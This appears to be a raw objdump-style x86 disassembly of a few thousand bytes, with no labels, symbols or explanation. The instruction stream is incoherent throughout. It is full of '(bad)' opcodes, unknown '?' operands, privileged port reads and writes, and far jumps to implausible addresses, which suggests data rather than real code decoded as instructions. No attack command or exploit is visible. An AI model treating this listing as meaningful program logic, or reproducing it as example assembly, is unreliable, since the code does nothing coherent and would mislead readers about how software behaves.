  444af6:	fdivr  QWORD PTR [esi]
  444af8:	pop    esi
  444af9:	sti    
  444afa:	mov    ebx,DWORD PTR [esi+0x4c37361d]
  444b00:	in     eax,0x5f
  444b02:	sti    
  444b03:	mov    bh,0x7d
  444b05:	call   0x83bc:0xad5a56a9
  444b0c:	pop    ebp
  444b0d:	xchg   ebx,eax
  444b0e:	pop    ds
  444b0f:	add    eax,0x2f4519a5
  444b14:	xchg   edx,eax
  444b15:	inc    ebx
  444b16:	lock mov ds:0x976d2776,eax
  444b1c:	pop    ebx
  444b1d:	mov    edx,0x95965b83
  444b22:	ds jno 0x444b83
  444b25:	dec    ebp
  444b26:	fistp  QWORD PTR [esi-0x22]
  444b29:	mov    ebp,0x733fcdad
  444b2e:	out    0x72,eax
  444b30:	jne    0x444b92
  444b32:	or     eax,0x67d35927
  444b37:	sbb    al,0x5e
  444b39:	in     al,0x66
  444b3b:	add    DWORD PTR [esi],ebx
  444b3d:	ror    ah,0x22
  444b40:	mov    ebp,0x5e4ea931
  444b45:	mov    ebx,0x70897b62
  444b4a:	out    dx,al
  444b4b:	shr    bh,0xaf
  444b4e:	aaa    
  444b4f:	or     eax,0xa880c3b7
  444b54:	lea    ecx,[edx+esi*4-0x3a]
  444b58:	sub    cl,dl
  444b5a:	cmp    esp,DWORD PTR [ecx]
  444b5c:	(bad)  
  444b5d:	sahf   
  444b5e:	ficomp WORD PTR [ebx+0x5e]
  444b61:	inc    edi
  444b62:	push   ds
  444b63:	mov    esp,0xd5d8ab60
  444b68:	xchg   esp,eax
  444b69:	pop    esp
  444b6a:	pop    cx
  444b6c:	dec    esp
  444b6d:	xchg   ebx,eax
  444b6e:	jg     0x444bd1
  444b70:	jle    0x444bca
  444b72:	sbb    esp,DWORD PTR [eax-0x4075e1ee]
  444b78:	imul   eax,ecx,0x6819beee
  444b7e:	fidiv  DWORD PTR [edx]
  444b80:	gs pop edx
  444b82:	push   cs
  444b83:	push   edx
  444b84:	(bad)  
  444b85:	rol    BYTE PTR [edx+0x92bf3a1],cl
  444b8b:	cld    
  444b8c:	gs jmp 0xe19c5ab4
  444b92:	(bad)
  444b95:	data16 into 
  444b97:	sahf   
  444b98:	sub    edi,esi
  444b9a:	and    DWORD PTR [esi-0x42],ebp
  444b9d:	inc    ecx
  444b9e:	sub    al,0x71
  444ba0:	and    ebx,eax
  444ba2:	ret    0x73bc
  444ba5:	pusha  
  444ba6:	pop    ecx
  444ba7:	cmp    BYTE PTR [esi+0x45731cf5],cl
  444bad:	popa   
  444bae:	outs   dx,DWORD PTR ds:[esi]
  444baf:	or     eax,0x65c7b890
  444bb4:	pusha  
  444bb5:	mov    edi,0x611099c2
  444bba:	stos   BYTE PTR es:[edi],al
  444bbb:	pushf  
  444bbc:	out    dx,al
  444bbd:	inc    ecx
  444bbe:	int    0x4d
  444bc0:	shr    DWORD PTR [ebx],1
  444bc2:	mov    al,ds:0xe260b8ed
  444bc7:	mov    edi,0x3117bb4e
  444bcc:	in     al,0x56
  444bce:	out    dx,al
  444bcf:	mov    bh,0xab
  444bd2:	sbb    esp,ecx
  444bd4:	in     eax,dx
  444bd5:	add    DWORD PTR [edx+0xe3094a1],eax
  444bdb:	or     esp,DWORD PTR [eax]
  444bdd:	fistp  DWORD PTR [edi]
  444bdf:	fnstsw WORD PTR [esi-0x71]
  444be2:	repnz sub DWORD PTR [esp+eax*4-0x5],ebp
  444be7:	pushf  
  444be8:	retf   0x6552
  444beb:	mov    edx,0x35ce33cf
  444bf0:	cmp    ch,BYTE PTR cs:[edx+0x2b]
  444bf4:	pop    esi
  444bf5:	xor    bl,BYTE PTR [ebp-0x1b62c42b]
  444bfb:	test   edi,edx
  444bfd:	jo     0x444bd2
  444bff:	pop    ss
  444c00:	mov    dh,0x36
  444c02:	gs (bad) 
  444c04:	pop    esi
  444c05:	ficom  WORD PTR [edx]
  444c07:	mov    bh,0x7e
  444c09:	dec    ebp
  444c0a:	adc    eax,0x4d52b38c
  444c0f:	and    cl,ch
  444c11:	mov    cl,0x6e
  444c13:	out    0x79,al
  444c15:	jp     0x444bc1
  444c17:	retf   
  444c18:	pop    esi
  444c19:	pop    edi
  444c1a:	ins    DWORD PTR es:[edi],dx
  444c1b:	leave  
  444c1c:	xor    eax,0xfbf77f70
  444c21:	pusha  
  444c22:	xchg   edx,eax
  444c23:	mov    edi,0x77bab87d
  444c28:	adc    edi,DWORD PTR [ebx+0x45364001]
  444c2e:	in     eax,dx
  444c2f:	push   ebp
  444c30:	push   edi
  444c31:	int3   
  444c32:	retf   
  444c33:	sbb    eax,0xa09f748a
  444c38:	fs fwait
  444c3a:	daa    
  444c3b:	mov    esi,ebx
  444c3d:	rcl    BYTE PTR ds:0x86deab29,0x88
  444c44:	push   edx
  444c45:	(bad)  
  444c46:	mov    dh,0x84
  444c48:	and    eax,0xb20bccf
  444c4d:	cmp    BYTE PTR [edx-0x79378f84],al
  444c53:	clc    
  444c54:	jnp    0x444cb6
  444c56:	inc    edx
  444c57:	data16 (bad) 
  444c59:	sub    ebx,DWORD PTR [esi-0x42]
  444c5c:	(bad)  
  444c5d:	jmp    0x96a:0x67df32ee
  444c64:	mov    bh,BYTE PTR [ebp-0x10]
  444c67:	stos   BYTE PTR es:[edi],al
  444c68:	pop    edi
  444c69:	or     eax,0x60908488
  444c6e:	push   ecx
  444c6f:	int3   
  444c70:	data16 aas 
  444c72:	repz enter 0xec5b,0x68
  444c77:	sahf   
  444c78:	pop    esp
  444c79:	sub    BYTE PTR [ebp-0x45],cl
  444c7c:	retf   0x56d5
  444c7f:	push   ss
  444c80:	inc    ebx
  444c81:	rol    DWORD PTR [esi-0x5f],1
  444c84:	sbb    ecx,DWORD PTR [eax-0x5f]
  444c87:	xchg   edx,eax
  444c88:	jp     0x444cdd
  444c8a:	(bad)  
  444c8b:	push   cs
  444c8c:	push   ebx
  444c8d:	cdq    
  444c8e:	ins    DWORD PTR es:[edi],dx
  444c8f:	fstp   DWORD PTR [esi]
  444c91:	lds    esi,FWORD PTR [ebp-0x1b]
  444c94:	pusha  
  444c95:	daa    
  444c96:	stos   DWORD PTR es:[edi],eax
  444c97:	mov    al,ds:0x90576c75
  444c9c:	cmp    BYTE PTR [eax-0x7d],bh
  444c9f:	cs pop esi
  444ca1:	pop    esi
  444ca2:	sbb    al,0xf8
  444ca4:	dec    ebp
  444ca5:	push   edx
  444ca6:	mov    ebx,0x5f60d0d5
  444cab:	mov    ?,esi
  444cad:	push   0x72
  444caf:	mov    ebp,0x1beec58f
  444cb4:	cmp    al,0x5e
  444cb6:	cmp    ah,BYTE PTR [eax-0x69]
  444cb9:	add    DWORD PTR ds:0x74e0d0a2,edx
  444cbf:	mov    eax,DWORD PTR [ecx]
  444cc1:	aad    0x2c
  444cc3:	imul   ebx,DWORD PTR [esi-0x10fa474],0xffffffea
  444cca:	int3   
  444ccb:	push   esi
  444ccc:	jg     0x444d02
  444cce:	push   ebp
  444ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444cd0:	mov    esp,0x92154ff5
  444cd5:	and    al,0xa5
  444cd7:	cmp    DWORD PTR [esi+0x5e404684],ecx
  444cdd:	dec    esp
  444cde:	inc    DWORD PTR [esi]
  444ce0:	or     DWORD PTR [esi+0x61cd62aa],esi
  444ce6:	mov    ds:0x6ff35e76,al
  444ceb:	leave  
  444cec:	mov    ds:0xd64968be,al
  444cf1:	stos   BYTE PTR es:[edi],al
  444cf2:	pop    esp
  444cf3:	sbb    ebx,DWORD PTR [esi+0x48]
  444cf6:	popf   
  444cf7:	test   dh,cl
  444cf9:	and    bl,BYTE PTR [ebx]
  444cfb:	dec    ebp
  444cfc:	mov    esp,DWORD PTR [eax-0x9]
  444cff:	pushf  
  444d00:	adc    DWORD PTR [esi],edi
  444d02:	push   0xee7528fc
  444d07:	(bad)  
  444d08:	adc    eax,0x937e42e
  444d0d:	and    al,BYTE PTR [ecx-0x3361425f]
  444d13:	in     al,dx
  444d14:	jcxz   0x444d24
  444d17:	mov    ch,0x38
  444d19:	(bad)  
  444d1a:	or     ah,BYTE PTR [ecx]
  444d1c:	jnp    0x444cda
  444d1e:	push   edx
  444d1f:	stos   BYTE PTR es:[edi],al
  444d20:	and    dh,dh
  444d22:	sahf   
  444d23:	mov    ds:0xeead81ed,al
  444d28:	sub    al,0x4
  444d2a:	idiv   BYTE PTR [eax-0x33]
  444d2d:	jae    0x444cf1
  444d2f:	pop    ss
  444d30:	inc    edx
  444d31:	fs scas eax,DWORD PTR es:[edi]
  444d33:	and    bh,dh
  444d35:	fst    DWORD PTR [esi]
  444d37:	push   edi
  444d38:	jb     0x444d86
  444d3a:	aam    0xa0
  444d3c:	es leave 
  444d3e:	iret   
  444d3f:	stos   DWORD PTR es:[edi],eax
  444d40:	push   0x6d
  444d42:	cmp    BYTE PTR [edi+0x412475e],0x73
  444d49:	mov    esi,0x5daccfe6
  444d4e:	xor    DWORD PTR [esi-0x2a],0xffffffc1
  444d52:	mov    cl,0x97
  444d54:	sahf   
  444d55:	push   ebp
  444d56:	cld    
  444d57:	cdq    
  444d58:	pop    esi
  444d59:	bound  esp,QWORD PTR ds:0x2cb52dd7
  444d5f:	mov    eax,0xfe075d9a
  444d64:	leave  
  444d65:	dec    ebp
  444d66:	dec    edx
  444d67:	cmp    cl,BYTE PTR [esi+0x6a1372fa]
  444d6d:	call   0x4490:0x3f80ddee
  444d74:	hlt    
  444d75:	sub    ecx,esi
  444d77:	mov    ds:0xb42eb014,al
  444d7c:	mov    al,ds:0xe3f42c7d
  444d81:	mov    bh,al
  444d83:	inc    ecx
  444d84:	in     al,dx
  444d85:	xor    cl,bl
  444d87:	xchg   ebp,eax
  444d88:	cmovs  ebx,ebx
  444d8b:	jle    0x444deb
  444d8d:	jmp    0x444df3
  444d8f:	pop    ecx
  444d90:	push   cs
  444d91:	xor    al,BYTE PTR [esi]
  444d93:	xor    BYTE PTR [edi],bh
  444d95:	sbb    edx,ebp
  444d97:	mov    cl,0x5e
  444d99:	idiv   DWORD PTR [ebx]
  444d9b:	or     DWORD PTR [esi],edx
  444d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444d9e:	loopne 0x444df2
  444da0:	pop    esi
  444da1:	and    BYTE PTR [esi-0x15],0x41
  444da5:	repnz lea edi,[esi+0x65]
  444da9:	mov    ds:0x6e7eadb3,eax
  444dae:	out    dx,al
  444daf:	sub    DWORD PTR [eax-0x6b],esi
  444db2:	mov    ah,0x4f
  444db4:	jg     0x444e2f
  444db6:	repz dec esi
  444db8:	xor    edx,eax
  444dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444dbb:	push   0x7a2d6078
  444dc0:	mov    al,ds:0x9e8c6c7b
  444dc5:	adc    esi,ebp
  444dc7:	push   ecx
  444dc8:	add    edi,edi
  444dca:	mov    esi,0x536dbe84
  444dcf:	mov    eax,ds:0x1d8b21d2
  444dd4:	dec    edi
  444dd5:	test   ecx,ebp
  444dd7:	xchg   BYTE PTR [ebx+0x3a],ah
  444dda:	retf   
  444ddb:	lea    edx,[ebp+0x2dad8f20]
  444de1:	mov    ds:0x5a28a108,al
  444de6:	jne    0x444e42
  444de8:	pop    sp
  444dea:	pop    edx
  444deb:	mov    ebx,DWORD PTR [esi-0x69]
  444dee:	cmc    
  444def:	cli    
  444df0:	adc    DWORD PTR [edx-0x64],0xb930a418
  444df7:	test   BYTE PTR [eax+eiz*2-0x185cbad9],0x80
  444dff:	dec    esi
  444e00:	fmul   st,st(7)
  444e02:	out    dx,al
  444e03:	add    BYTE PTR [edi-0x21],al
  444e06:	(bad)  
  444e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444e08:	ret    
  444e09:	stos   BYTE PTR es:[edi],al
  444e0a:	imul   esp,DWORD PTR [eax+0x59d26e03],0x21c1faa4
  444e14:	mov    ecx,0xcf912abb
  444e19:	lods   al,BYTE PTR ds:[esi]
  444e1a:	cwde   
  444e1b:	jb     0x444e7b
  444e1d:	scas   eax,DWORD PTR es:[edi]
  444e1e:	push   ds
  444e1f:	jo     0x444e23
  444e21:	stos   DWORD PTR es:[edi],eax
  444e22:	push   ebp
  444e23:	(bad)  
  444e24:	shl    DWORD PTR [eax+0x6f],1
  444e27:	and    eax,0x6ca2658b
  444e2c:	inc    edx
  444e2d:	dec    ebx
  444e2e:	out    dx,al
  444e2f:	(bad)  [ebp-0xacaad9a]
  444e35:	lahf   
  444e36:	fwait
  444e37:	mov    eax,ds:0x9bdb3ab6
  444e3c:	(bad)  
  444e3d:	xchg   edx,eax
  444e3e:	int    0x76
  444e40:	pop    ebp
  444e41:	outs   dx,DWORD PTR ds:[esi]
  444e42:	mov    eax,ds:0x1b49f020
  444e47:	pop    ss
  444e48:	xchg   esi,eax
  444e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444e4a:	cmp    ah,BYTE PTR [ecx-0x153b96cc]
  444e50:	pop    esp
  444e51:	cmp    DWORD PTR [ecx+0x6c],esi
  444e54:	push   esp
  444e55:	(bad)  
  444e56:	ja     0x444dde
  444e58:	pop    esi
  444e59:	and    DWORD PTR [ecx],ebx
  444e5b:	jmp    0xe9b1:0x899a1417
  444e62:	and    BYTE PTR ds:0xc1e7d7b6,dl
  444e68:	mov    eax,ds:0xce246d00
  444e6d:	xchg   BYTE PTR [edx],bh
  444e6f:	es cdq 
  444e71:	inc    ecx
  444e72:	mov    ds:0x8c1b9bab,al
  444e77:	int3   
  444e78:	xchg   ebx,eax
  444e79:	mov    dh,0x2e
  444e7b:	adc    ah,BYTE PTR [edi-0x5a]
  444e7e:	ins    BYTE PTR es:[edi],dx
  444e7f:	mov    ds:0xae2df504,al
  444e84:	cdq    
  444e85:	out    dx,al
  444e86:	xchg   edi,eax
  444e87:	jne    0x444e58
  444e89:	mov    dl,0xee
  444e8b:	jo     0x444e3c
  444e8d:	mov    ecx,0x436a6783
  444e92:	ret    0x25a0
  444e95:	sub    eax,0xe5863ac8
  444e9a:	cmp    ecx,ecx
  444e9c:	es popf 
  444e9e:	and    DWORD PTR [ecx+0x5086e162],esp
  444ea4:	out    0x94,al
  444ea6:	or     DWORD PTR [ecx+0xa7c4d7b],esp
  444eac:	test   DWORD PTR [edi-0x72a474a7],edi
  444eb2:	stc    
  444eb3:	(bad)  
  444eb4:	cli    
  444eb5:	hlt    
  444eb6:	outs   dx,BYTE PTR ds:[esi]
  444eb7:	mov    ecx,0xa1e77f89
  444ebc:	pop    ecx
  444ebd:	or     ah,BYTE PTR [edx-0x705b47b7]
  444ec3:	pop    ecx
  444ec4:	in     al,0x33
  444ec6:	out    dx,al
  444ec7:	fsubr  DWORD PTR [ebx+0x7c1e2c5f]
  444ecd:	adc    esp,DWORD PTR [esi]
  444ecf:	mov    eax,ds:0x693c26bd
  444ed4:	push   ebp
  444ed5:	push   0x5a5eea01
  444eda:	outs   dx,BYTE PTR ds:[esi]
  444edb:	loopne 0x444ea6
  444edd:	jle    0x444e7b
  444edf:	stc    
  444ee0:	push   ebx
  444ee1:	dec    esi
  444ee2:	xchg   BYTE PTR [edx+eiz*4],al
  444ee5:	pusha  
  444ee6:	inc    eax
  444ee7:	repnz and eax,0x5e308c58
  444eed:	or     al,0x8e
  444eef:	inc    eax
  444ef0:	jbe    0x444f0a
  444ef2:	xor    eax,0xd45df355
  444ef7:	mov    eax,0x77f171fd
  444efc:	retf   
  444efd:	xor    cl,ch
  444eff:	sub    eax,0x25ee9bcd
  444f04:	fwait
  444f05:	jo     0x444f77
  444f07:	das    
  444f08:	ds xor al,0x8
  444f0b:	xor    DWORD PTR [eax-0x76a056a7],edx
  444f11:	sbb    bh,dh
  444f13:	push   eax
  444f14:	mov    dh,0x65
  444f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444f17:	ds pop esi
  444f19:	pop    es
  444f1a:	dec    ecx
  444f1b:	das    
  444f1c:	hlt    
  444f1d:	cwde   
  444f1e:	je     0x444ebb
  444f20:	stos   DWORD PTR es:[edi],eax
  444f21:	pusha  
  444f22:	mov    WORD PTR [eax+0x77700b20],?
  444f28:	pop    eax
  444f29:	enter  0x2b2,0xa1
  444f2d:	pop    ebp
  444f2e:	xchg   BYTE PTR [ebx+0x7955f884],bh
  444f34:	push   0x54
  444f36:	mov    ah,0x9e
  444f38:	repz push esi
  444f3a:	enter  0x1401,0x96
  444f3e:	add    eax,0x4b607304
  444f43:	je     0x444f68
  444f45:	add    DWORD PTR [ebx-0x5f],0x5c
  444f49:	sub    eax,DWORD PTR [edi]
  444f4b:	jne    0x444f91
  444f4d:	sub    BYTE PTR [edi-0x61],0x63
  444f51:	mov    edx,0xc1080aca
  444f56:	shl    BYTE PTR [edi],0x70
  444f59:	ins    BYTE PTR es:[edi],dx
  444f5a:	aaa    
  444f5b:	mov    eax,ds:0x873eb048
  444f60:	xor    eax,0x5e26e2cc
  444f65:	mov    bh,0x44
  444f67:	sub    BYTE PTR [edx+ebx*4+0x61281026],ah
  444f6e:	mov    al,ds:0x3c1cba18
  444f73:	pop    ds
  444f74:	je     0x444fb0
  444f76:	out    dx,al
  444f77:	loop   0x444fa6
  444f79:	xchg   BYTE PTR [ebp-0x40],ah
  444f7c:	mov    eax,0x9fd8fe35
  444f81:	push   ebp
  444f82:	add    bl,cl
  444f84:	sbb    al,0x21
  444f86:	adc    BYTE PTR [edx+0xea01445],dl
  444f8c:	fild   QWORD PTR fs:[ebp-0x1c]
  444f90:	jge    0x444f92
  444f92:	cmp    DWORD PTR [eax-0x31],0xfffffff6
  444f96:	aaa    
  444f97:	mov    ?,WORD PTR [esi-0x42]
  444f9a:	addr16 loope 0x444fbb
  444f9d:	xchg   esp,eax
  444f9e:	cmp    BYTE PTR [ebx-0x1d115bcb],ch
  444fa4:	add    DWORD PTR [ecx-0x58],0x543ed117
  444fab:	mov    eax,ds:0x7626d59c
  444fb0:	dec    eax
  444fb1:	out    dx,eax
  444fb2:	ret    
  444fb3:	jecxz  0x445007
  444fb5:	xchg   ecx,eax
  444fb6:	inc    esi
  444fb7:	dec    esi
  444fb8:	pop    esi
  444fb9:	mov    edx,0xf8627f70
  444fbe:	dec    esp
  444fbf:	mov    eax,ds:0x3cf8ad9b
  444fc4:	dec    ebp
  444fc5:	ins    BYTE PTR es:[edi],dx
  444fc6:	sbb    BYTE PTR [ebx+0x5e],dl
  444fc9:	and    dh,BYTE PTR [ebx]
  444fcb:	int3   
  444fcc:	icebp  
  444fcd:	jae    0x445007
  444fcf:	daa    
  444fd0:	sbb    al,0x61
  444fd2:	es ret 0x4082
  444fd6:	aas    
  444fd7:	add    eax,0xfbee75e5
  444fdc:	jl     0x444fbb
  444fde:	repz test eax,0x858794fb
  444fe4:	mov    esp,DWORD PTR [eax+0x1d]
  444fe7:	fprem  
  444fe9:	jnp    0x444f7e
  444feb:	add    al,0x95
  444fed:	adc    dh,ch
  444fef:	lods   al,BYTE PTR ds:[esi]
  444ff0:	add    eax,0xd77d89ca
  444ff5:	sub    al,BYTE PTR ds:0x97f810a1
  444ffb:	in     al,dx
  444ffc:	mov    dh,BYTE PTR [eax+0x275ecba7]
  445002:	sar    DWORD PTR [esi+0x7b],0x2c
  445006:	sbb    BYTE PTR [edx],cl
  445008:	xlat   BYTE PTR ds:[ebx]
  445009:	push   edx
  44500a:	in     eax,dx
  44500b:	inc    ecx
  44500c:	jge    0x445024
  44500e:	cs ins DWORD PTR es:[edi],dx
  445010:	mov    eax,ds:0x6a80302f
  445015:	mov    esi,ebp
  445017:	in     al,0x68
  445019:	lods   eax,DWORD PTR ds:[esi]
  44501a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44501b:	mov    edx,0xa1114aaf
  445020:	jmp    0xdd09:0xc44b9419
  445027:	cwde   
  445028:	gs loopne 0x44500f
  44502b:	sahf   
  44502c:	(bad)  
  44502d:	loopne 0x445039
  44502f:	outs   dx,DWORD PTR ds:[esi]
  445030:	xchg   ch,dl
  445032:	pop    ss
  445033:	mov    gs,WORD PTR [edx-0x2c]
  445036:	push   0xb9848524
  44503b:	mov    eax,DWORD PTR [esi+0x5efb6cc2]
  445041:	mov    al,0x94
  445043:	sub    bh,BYTE PTR [ecx+0x364e9773]
  445049:	pop    edx
  44504a:	xor    dh,bl
  44504c:	push   cs
  44504d:	dec    eax
  44504e:	add    DWORD PTR [ecx-0x6e],eax
  445051:	aad    0x67
  445053:	ja     0x444fd9
  445055:	je     0x445045
  445057:	xchg   ecx,eax
  445058:	and    BYTE PTR [ebp-0x102654c2],0x13
  44505f:	jge    0x44509c
  445061:	popa   
  445062:	inc    edi
  445063:	fxch   st(2)
  445065:	xchg   al,bh
  445067:	inc    ebx
  445068:	mov    cl,0xf0
  44506a:	out    dx,al
  44506b:	div    ebp
  44506d:	push   esi
  44506e:	jl     0x4450a6
  445070:	fbstp  TBYTE PTR [ebx+0x50]
  445073:	mov    eax,ds:0x33b0849d
  445078:	nop
  445079:	popa   
  44507a:	add    DWORD PTR [edi],ebx
  44507c:	pop    ebp
  44507d:	inc    esi
  44507e:	or     bh,BYTE PTR [eax+0x20]
  445081:	ja     0x44504f
  445083:	leave  
  445084:	in     eax,dx
  445085:	mov    ds:0x60ee693a,al
  44508a:	xor    DWORD PTR [ebx+edi*1],0x1841f7d0
  445091:	push   edi
  445092:	and    DWORD PTR [esp+eax*1+0x61],esp
  445096:	inc    ecx
  445097:	and    al,0x6e
  445099:	jmp    0x4450cc
  44509b:	sub    al,0xc3
  44509d:	pop    edi
  44509e:	xor    BYTE PTR [esi],ch
  4450a0:	rol    BYTE PTR ds:0x708980de,1
  4450a6:	and    BYTE PTR [ebp+0x5e],bh
  4450a9:	sbb    DWORD PTR [ebx+0xefc6476],ebp
  4450af:	inc    edx
  4450b0:	aad    0x40
  4450b2:	pop    esi
  4450b3:	jp     0x445066
  4450b5:	jno    0x44508c
  4450b7:	fistp  DWORD PTR [esi-0x14]
  4450ba:	push   ebp
  4450bb:	sub    eax,0x5f01c403
  4450c0:	mov    esi,0x6262d860
  4450c5:	xor    al,dh
  4450c7:	repz xor al,0x7c
  4450ca:	out    dx,al
  4450cb:	out    0xac,eax
  4450cd:	leave  
  4450ce:	loope  0x445058
  4450d0:	fdivr  st(4),st
  4450d2:	inc    eax
  4450d3:	mov    eax,ds:0x5c4b7a31
  4450d8:	add    eax,0x37443532
  4450dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4450de:	adc    ebp,DWORD PTR [ecx]
  4450e0:	adc    ah,BYTE PTR [ecx-0x1a]
  4450e3:	repz lds ecx,FWORD PTR [edi+0x611d93e7]
  4450ea:	(bad)  ds:[edi-0x1d]
  4450ee:	mov    ds:0xee80d13b,al
  4450f3:	loop   0x44513f
  4450f5:	stc    
  4450f6:	je     0x445147
  4450f8:	add    ebx,eax
  4450fa:	ret    0x26a0
  4450fd:	push   ss
  4450fe:	fld    st(1)
  445100:	sbb    BYTE PTR [esi+0x1d54bb1d],al
  445106:	mov    esp,0xdcd61e0f
  44510b:	test   eax,0x70d7f5ac
  445110:	xor    ah,BYTE PTR [ecx-0x36]
  445113:	sbb    eax,0xd1c53643
  445118:	in     al,0xff
  44511a:	out    dx,al
  44511b:	stos   BYTE PTR es:[edi],al
  44511c:	sub    al,0x5c
  44511e:	or     eax,0x7bfe2c6
  445123:	mov    eax,ds:0x37e53edf
  445128:	pop    ds
  445129:	or     eax,0xce5f27ad
  44512e:	push   edx
  44512f:	sbb    bh,BYTE PTR [eax]
  445131:	jno    0x445147
  445133:	sbb    DWORD PTR [esi+0x5e],edi
  445136:	pop    esp
  445137:	mov    eax,ds:0x51d5f9a0
  44513c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44513d:	ret    
  44513e:	(bad)  
  44513f:	icebp  
  445140:	aaa    
  445141:	out    0x38,eax
  445143:	mov    eax,ds:0xffa9398a
  445148:	xchg   DWORD PTR [ebp+esi*4-0x16c79056],ebx
  44514f:	or     ah,dl
  445151:	adc    DWORD PTR [edi+0x14532221],edx
  445157:	xor    BYTE PTR [esi+0x40],bl
  44515a:	or     DWORD PTR [ecx],0x224f4a8d
  445160:	aam    0x60
  445162:	outs   dx,BYTE PTR ds:[esi]
  445163:	pop    eax
  445164:	(bad)  
  445166:	arpl   WORD PTR [eax-0x6711dc1e],di
  44516c:	push   edx
  44516d:	cmp    BYTE PTR [edx],0xd4
  445170:	sbb    dh,BYTE PTR [edx-0x14235b91]
  445176:	push   ss
  445177:	jo     0x44513a
  445179:	pop    ebx
  44517a:	ss ja  0x445194
  44517d:	dec    eax
  44517e:	add    bl,ah
  445180:	cmp    DWORD PTR [esi-0x1a20b394],ebp
  445186:	popa   
  445187:	fs popf 
  445189:	cwde   
  44518a:	or     al,0xf7
  44518c:	xor    esp,DWORD PTR [ecx+0x4b]
  44518f:	xor    BYTE PTR [ebx],cl
  445191:	mov    bh,0x8d
  445193:	mov    al,ds:0x3dfa4de6
  445198:	shr    BYTE PTR [eax+0x2e],1
  44519b:	mov    eax,ds:0xbf2deca5
  4451a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4451a1:	fist   DWORD PTR [ebx-0x5f]
  4451a4:	ins    DWORD PTR es:[edi],dx
  4451a5:	sbb    al,0x27
  4451a7:	mov    esp,0x8b88a78f
  4451ac:	cs ins BYTE PTR es:[edi],dx
  4451ae:	or     DWORD PTR [ebp+0x62],esp
  4451b1:	pop    esi
  4451b2:	sbb    bl,BYTE PTR [ecx+edx*8+0x5ec1d80f]
  4451b9:	rcl    DWORD PTR [esi],cl
  4451bb:	enter  0x2682,0x54
  4451bf:	jne    0x44521f
  4451c1:	repnz inc edi
  4451c3:	jl     0x44518c
  4451c5:	xchg   DWORD PTR [edx-0x76aa83ef],ebx
  4451cb:	retf   
  4451cc:	pop    edi
  4451cd:	jbe    0x4451bd
  4451cf:	cdq    
  4451d0:	daa    
  4451d1:	inc    edx
  4451d2:	sbb    dl,BYTE PTR [ebx+0x64]
  4451d5:	mov    ds:0xc11b23c6,al
  4451da:	cmp    BYTE PTR [esp+edi*4+0x69],dl
  4451de:	inc    esi
  4451df:	mov    eax,ds:0x6cbe0363
  4451e4:	adc    al,ch
  4451e6:	xor    DWORD PTR [edi],0x5b
  4451e9:	repz popa 
  4451eb:	jmp    0x4451f8
  4451ed:	jne    0x44523d
  4451ef:	lock jne 0x445176
  4451f2:	sahf   
  4451f3:	mov    eax,ds:0x390ff519
  4451f8:	shl    BYTE PTR [edx+0xb34c48a],cl
  4451fe:	les    esp,FWORD PTR [eax+0x58d108f1]
  445204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445205:	sahf   
  445206:	(bad)  [edi+0x615ed8b5]
  44520c:	push   eax
  44520d:	pop    esi
  44520e:	pop    eax
  44520f:	inc    eax
  445210:	leave  
  445211:	xchg   ecx,eax
  445212:	push   eax
  445213:	aas    
  445214:	pop    esi
  445215:	es sbb eax,0xf2096dcb
  44521b:	push   cs
  44521c:	xor    DWORD PTR [ebp+0x1eb2a974],ebp
  445222:	outs   dx,BYTE PTR ds:[esi]
  445223:	xchg   esp,eax
  445224:	(bad)  
  445225:	sub    eax,edx
  445227:	add    eax,0x3fee7033
  44522c:	mov    ch,0x18
  44522e:	outs   dx,DWORD PTR ds:[si]
  445230:	add    ebp,ebp
  445232:	sbb    ah,BYTE PTR [ecx+0x3b7f72ad]
  445238:	inc    ecx
  445239:	push   ds
  44523a:	jnp    0x4452ad
  44523c:	pop    ebp
  44523d:	test   al,0x44
  44523f:	jmp    0x67c2a37a
  445244:	(bad)  
  445245:	jmp    0x5af3:0xf0e3a42e
  44524c:	in     eax,0x93
  44524e:	add    DWORD PTR [si],edx
  445251:	inc    ebx
  445252:	push   ecx
  445253:	adc    dl,BYTE PTR [ebx+0x4]
  445256:	ss (bad) 
  445258:	sahf   
  445259:	mov    ecx,esi
  44525b:	ds cmp eax,0xf2a0c70e
  445261:	jbe    0x44523b
  445263:	sub    esp,DWORD PTR [ebp+0x5e]
  445266:	push   ds
  445267:	pop    es
  445268:	dec    ebx
  445269:	add    ecx,esp
  44526b:	dec    ebp
  44526c:	pop    esi
  44526d:	cmp    ah,BYTE PTR [ebp-0x7c]
  445270:	xor    BYTE PTR [eax],0x37
  445273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445274:	ja     0x4452e0
  445276:	mov    esp,ds
  445278:	mov    WORD PTR [edi+0x7e],gs
  44527b:	and    DWORD PTR [edx-0x4e9c11c5],ebp
  445281:	js     0x4452ef
  445283:	loopne 0x445205
  445285:	or     eax,0x50df8e18
  44528a:	sbb    al,0x61
  44528c:	sub    BYTE PTR [ecx-0x52],dh
  44528f:	ror    DWORD PTR [eax],0x1
  445292:	out    dx,eax
  445293:	xchg   DWORD PTR [edx],edx
  445295:	jnp    0x4452e0
  445297:	jns    0x4452a9
  445299:	retf   
  44529a:	lods   eax,DWORD PTR ds:[esi]
  44529b:	mov    al,ds:0x48f15000
  4452a0:	aad    0xa5
  4452a2:	mov    ch,BYTE PTR [ecx+0x74]
  4452a5:	mov    ch,0xee
  4452a7:	cmc    
  4452a8:	(bad)  
  4452a9:	pop    eax
  4452aa:	mov    dh,0x16
  4452ac:	mov    bl,BYTE PTR [ebx+0x7b]
  4452af:	in     eax,dx
  4452b0:	shl    DWORD PTR [eax-0x54],cl
  4452b3:	int    0xaa
  4452b5:	mov    es,WORD PTR ds:0xeb43b0a4
  4452bb:	nop
  4452bc:	js     0x445240
  4452be:	int3   
  4452bf:	or     al,0xa3
  4452c1:	shl    BYTE PTR [ebp+0x3f6063e9],0xdc
  4452c8:	sub    eax,0xa44bca41
  4452cd:	loopne 0x4452af
